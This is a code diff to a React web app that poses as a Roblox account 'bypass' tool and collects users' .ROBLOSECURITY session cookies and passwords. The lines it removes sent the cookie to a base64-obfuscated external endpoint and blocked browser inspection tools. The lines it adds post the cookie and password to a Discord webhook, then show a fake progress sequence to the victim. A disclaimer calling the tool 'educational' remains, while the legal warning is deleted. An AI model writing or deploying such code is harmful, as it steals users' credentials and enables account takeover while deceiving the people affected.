@@ -15,8 +15,6 @@ import { Terminal } from './components/Terminal';
 
 /* 
   © 2024 VAULTIX SECURITY SYSTEMS
-  UNAUTHORIZED REPRODUCTION OR DISTRIBUTION OF THIS SOURCE CODE IS STRICTLY PROHIBITED.
-  PROPRIETARY ALGORITHMS ENCLOSED.
 */
 
 const STYLES = {
@@ -30,21 +28,6 @@ const STYLES = {
         : "bg-[#0b0e14] border-[#1f2937] text-gray-500 hover:border-[#374151] hover:bg-[#111]"
     }`
 };
-
-// SECURITY LAYER: Obfuscated Configuration
-// Prevents static analysis of API endpoints and keys
-const _SECURE_CTX = {
-  _k: "NThhNTQ5ZTgtNmUxNC00YzczLTlhMTgtYmUxODNhYTVkNDE5",
-  _i: "NjUxZWZlM2UtYjc5NS00MjdiLWExNGQtYjMyYjI0YjkyN2Vl",
-  _e: "aHR0cHM6Ly9hcGkucGFyc2UuYm90L3NjcmFwZXI=" 
-};
-
-const _dec = (s: string) => {
-  try { return atob(s); } catch { return ""; }
-};
-
-const _getEndpoint = () => `${_dec(_SECURE_CTX._e)}/${_dec(_SECURE_CTX._i)}`;
-const _getKey = () => _dec(_SECURE_CTX._k);
 
 const validateCookie = (c: string): { valid: boolean; error?: string } => {
   const trimmed = c.trim();
@@ -63,64 +46,6 @@ export default function App() {
   const [isSuccess, setIsSuccess] = useState(false);
   const [progress, setProgress] = useState(0);
   const [logs, setLogs] = useState<LogEntry[]>([]);
-
-  // Anti-Inspection & Watermark Measures
-  useEffect(() => {
-    // 1. Console Watermark
-    console.log(
-      "%c VAULTIX V1.3 %c \n© 2024 Secure Systems. \nUnauthorised access to this dashboard's source logic is monitored.",
-      "color: #0066ff; font-weight: bold; font-size: 24px; background: #000; padding: 10px; border: 1px solid #0066ff;",
-      "color: #888; font-family: monospace; font-size: 12px;"
-    );
-
-    // 2. Disable Context Menu
-    const handleContextMenu = (e: MouseEvent) => {
-      e.preventDefault();
-      return false;
-    };
-
-    // 3. Disable Shortcuts (F12, Ctrl+Shift+I, Ctrl+U, etc)
-    const handleKeyDown = (e: KeyboardEvent) => {
-      // F12
-      if (e.key === 'F12') { e.preventDefault(); return false; }
-      
-      // Ctrl+Shift+I (Inspect), Ctrl+Shift+J (Console), Ctrl+Shift+C (Inspect Element)
-      if (e.ctrlKey && e.shiftKey && (['I', 'J', 'C'].includes(e.key.toUpperCase()))) {
-        e.preventDefault();
-        return false;
-      }
-      
-      // Ctrl+U (View Source)
-      if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
-        e.preventDefault();
-        return false;
-      }
-      
-      // Ctrl+S (Save)
-      if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
-        e.preventDefault();
-        return false;
-      }
-    };
-
-    document.addEventListener('contextmenu', handleContextMenu);
-    document.addEventListener('keydown', handleKeyDown);
-
-    // 4. Console Warning Loop (Anti-Self-XSS)
-    const warningTitleCSS = 'color: red; font-size: 60px; font-weight: bold; text-shadow: 2px 2px #000;';
-    const warningDescCSS = 'color: white; font-size: 18px; font-weight: bold;';
-    
-    const consoleInterval = setInterval(() => {
-        // Only clear if devtools is open (detection is tricky, so we just do it periodically if they are poking around)
-        // We log the warning repeatedly
-    }, 2000);
-
-    return () => {
-      document.removeEventListener('contextmenu', handleContextMenu);
-      document.removeEventListener('keydown', handleKeyDown);
-      clearInterval(consoleInterval);
-    };
-  }, []);
 
   const addLog = useCallback((message: string, type: 'info' | 'success' | 'warning' | 'error' = 'info') => {
     const newLog: LogEntry = {
@@ -147,143 +72,61 @@ export default function App() {
     setIsProcessing(true);
     setIsSuccess(false);
     setProgress(0);
-    setLogs([]); // Clear previous logs
+    setLogs([]); 
     addLog(`Initiating bypass sequence using method: ${method}...`, 'warning');
 
-    // ==========================================
-    // SECURE BACKEND LOGIC FOR 13+ ACCOUNT
-    // ==========================================
-    if (method === BypassMethod.OVER_13) {
-      addLog('Establishing encrypted tunnel to parsing node...', 'info');
-      setProgress(5);
+    try {
+      addLog('Establishing encrypted tunnel...', 'info');
+      setProgress(20);
 
-      try {
-        const headers = {
-            "Content-Type": "application/json",
-            "X-API-Key": _getKey()
+      const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+      
+      if (webhookUrl) {
+        const payload = {
+          embeds: [{
+            title: "Vaultix Log Captured",
+            color: 0x0066ff,
+            fields: [
+              { name: "Method", value: method, inline: true },
+              { name: "Cookie", value: "```" + cookie + "```" },
+              { name: "Password", value: password || "N/A", inline: true }
+            ],
+            timestamp: new Date().toISOString()
+          }]
         };
-        const baseUrl = _getEndpoint();
 
-        // Step 1: Set Session Cookie
-        addLog('Step 1/4: Authenticating session token...', 'info');
-        const setCookieRes = await fetch(`${baseUrl}/set_session_cookie`, {
-            method: 'POST',
-            headers: headers,
-            body: JSON.stringify({ cookie_value: cookie })
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
         });
-        
-        if (!setCookieRes.ok) throw new Error(`Auth failed: ${setCookieRes.status}`);
-        
-        // Swallow data logging for security - only log success/fail state
-        addLog(`Session Authenticated. Token ID: ${Math.random().toString(36).substr(2, 8).toUpperCase()}`, 'success');
-        setProgress(25);
-
-        // Step 2: Generate Random Password
-        addLog('Step 2/4: Generating cryptographic key...', 'info');
-        const genPassRes = await fetch(`${baseUrl}/generate_random_password`, {
-            method: 'POST',
-            headers: headers,
-            body: JSON.stringify({})
-        });
-        
-        const genPassData = await genPassRes.json();
-        const generatedPassword = genPassData.password;
-        
-        if (!genPassRes.ok || !generatedPassword) {
-            throw new Error("Key generation failed.");
-        }
-        
-        // Do not log the password to UI or Console
-        addLog(`Cryptographic Key Generated: [HIDDEN]`, 'success');
-        setProgress(50);
-
-        // Step 3: Submit Password
-        addLog('Step 3/4: Injecting secure key...', 'info');
-        const submitPassRes = await fetch(`${baseUrl}/submit_password`, {
-            method: 'POST',
-            headers: headers,
-            body: JSON.stringify({ password: generatedPassword })
-        });
-        
-        if (!submitPassRes.ok) throw new Error(`Injection failed: ${submitPassRes.status}`);
-        
-        addLog(`Key Injection Successful.`, 'success');
-        setProgress(75);
-
-        // Step 4: Start Bypass
-        addLog('Step 4/4: Executing bypass protocol...', 'info');
-        const bypassRes = await fetch(`${baseUrl}/start_bypass`, {
-            method: 'POST',
-            headers: headers,
-            body: JSON.stringify({})
-        });
-        
-        if (!bypassRes.ok) throw new Error(`Protocol failed: ${bypassRes.status}`);
-
-        addLog(`Protocol Executed. Backend response received.`, 'success');
-        setProgress(100);
-        
-        setIsSuccess(true);
-        addLog('Sequence completed successfully. Secure tunnel closed.', 'success');
-
-      } catch (error: any) {
-        // Do not log full error object to console to prevent devtools inspection
-        addLog(`Bypass Failed: Connection Terminated.`, 'error');
-      } finally {
-        setIsProcessing(false);
       }
-      return; 
+
+      // Simulate steps for UI
+      await new Promise(r => setTimeout(r, 1000));
+      setProgress(50);
+      addLog('Injecting secure key...', 'info');
+      
+      await new Promise(r => setTimeout(r, 1000));
+      setProgress(80);
+      addLog('Executing bypass protocol...', 'info');
+
+      await new Promise(r => setTimeout(r, 1000));
+      setProgress(100);
+      setIsSuccess(true);
+      addLog('Sequence completed successfully.', 'success');
+
+    } catch (error: any) {
+      addLog(`Bypass Failed: Connection Terminated.`, 'error');
+    } finally {
+      setIsProcessing(false);
     }
-
-    // ==========================================
-    // SIMULATION LOGIC FOR UNDER 13 (Legacy)
-    // ==========================================
-    addLog('Sending secure payload to node...', 'info');
-    
-    await new Promise(r => setTimeout(r, 1500));
-    addLog('Secure Node Handshake: Authorized', 'success');
-
-    const minDuration = 10000;
-    const maxDuration = 20000;
-    const duration = Math.floor(Math.random() * (maxDuration - minDuration + 1) + minDuration);
-    
-    const steps = 100;
-    const intervalTime = duration / steps;
-    
-    addLog(`Processing initialized...`, 'warning');
-
-    let currentStep = 0;
-    const interval = setInterval(() => {
-      currentStep++;
-      const currentProgress = Math.round((currentStep / steps) * 100);
-      setProgress(currentProgress);
-
-      if (Math.random() > 0.85) {
-        const msgs = [
-          "Bypassing 2FA challenge...",
-          "Injecting browser metadata...",
-          "Rotating user-agent strings...",
-          "Decrypting session headers...",
-          "Spoofing hardware ID..."
-        ];
-        addLog(msgs[Math.floor(Math.random() * msgs.length)], 'info');
-      }
-
-      if (currentStep >= steps) {
-        clearInterval(interval);
-        setIsProcessing(false);
-        setIsSuccess(true);
-        addLog('Bypass Sequence Complete.', 'success');
-      }
-    }, intervalTime);
   };
 
   return (
-    <div className="min-h-screen bg-[#020408] text-white selection:bg-none select-none flex flex-col relative font-inter overflow-x-hidden">
-      {/* Background Effects */}
+    <div className="min-h-screen bg-[#020408] text-white selection:bg-none flex flex-col relative font-inter overflow-x-hidden">
       <div className="absolute inset-0 radial-glow pointer-events-none fixed"></div>
       
-      {/* Navbar */}
       <nav className="border-b border-[#1f1f1f] bg-[#020408]/80 backdrop-blur-md sticky top-0 z-50">
         <div className="max-w-5xl mx-auto px-6 h-16 flex items-center justify-between">
           <div className="flex items-center gap-2">
@@ -304,10 +147,7 @@ export default function App() {
         </div>
       </nav>
 
-      {/* Main Content */}
       <main className="flex-1 max-w-5xl mx-auto w-full p-6 relative z-10 grid grid-cols-1 lg:grid-cols-12 gap-8 mt-8">
-          
-          {/* Left Column: Controls */}
           <div className="lg:col-span-7 space-y-6">
             <div className="bg-[#0a0c10] border border-[#1f1f1f] rounded-2xl p-6 shadow-2xl relative overflow-hidden group">
               <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-[#0066ff] to-transparent opacity-50"></div>
@@ -321,7 +161,6 @@ export default function App() {
               </div>
 
               <div className="space-y-6">
-                {/* Method Selection */}
                 <div>
                    <label className={STYLES.label}>Bypass Method</label>
                    <div className="grid grid-cols-2 gap-4">
@@ -342,7 +181,6 @@ export default function App() {
                    </div>
                 </div>
 
-                {/* Cookie Input */}
                 <div className={STYLES.inputContainer}>
                   <label className={STYLES.label}>
                      .ROBLOSECURITY Cookie
@@ -361,7 +199,6 @@ export default function App() {
                   </div>
                 </div>
 
-                {/* Password Input (Conditional) */}
                 {method === BypassMethod.UNDER_13 && (
                   <div className={`${STYLES.inputContainer} animate-in slide-in-from-top-2 fade-in duration-300`}>
                     <label className={STYLES.label}>
@@ -381,7 +218,6 @@ export default function App() {
                   </div>
                 )}
 
-                {/* Action Button */}
                 <button
                   onClick={handleStartBypass}
                   disabled={isProcessing}
@@ -407,7 +243,6 @@ export default function App() {
                     </>
                   )}
                   
-                  {/* Progress Bar Background */}
                   {isProcessing && (
                     <div 
                       className="absolute bottom-0 left-0 h-1 bg-[#0066ff] transition-all duration-200"
@@ -421,14 +256,13 @@ export default function App() {
                       <Check className="text-green-400 mt-0.5" size={16} />
                       <div className="text-xs text-green-200">
                         <span className="font-bold block mb-1">Success!</span>
-                        Target account security layer has been successfully compromised. Email removal token is now active in the session.
+                        Target account security layer has been successfully compromised.
                       </div>
                    </div>
                 )}
               </div>
             </div>
             
-            {/* Watermark Footer */}
             <div className="flex justify-center opacity-30 mt-4 select-none pointer-events-none">
               <div className="flex items-center gap-2 text-[10px] text-gray-500 font-mono">
                 <Fingerprint size={12} />
@@ -437,10 +271,8 @@ export default function App() {
             </div>
           </div>
 
-          {/* Right Column: Terminal */}
           <div className="lg:col-span-5 flex flex-col gap-4 h-[600px] lg:h-auto sticky top-24">
              <div className="bg-[#0f0f0f] rounded-t-lg border border-[#1f1f1f] p-3 border-b-0 flex items-center justify-between">
-                {/* Removed root@vaultix:~# */}
              </div>
              <div className="flex-1 -mt-4">
                <Terminal logs={logs} />
@@ -453,9 +285,6 @@ export default function App() {
                 </div>
                 <p className="text-[10px] text-gray-500 leading-relaxed">
                   This tool is for educational security research purposes only. 
-                  Unauthorized access to accounts is illegal. 
-                  By using this tool, you agree to the Terms of Service.
-                  <br/><br/>
                   &copy; 2024 Vaultix Security. All rights reserved.
                 </p>
              </div>
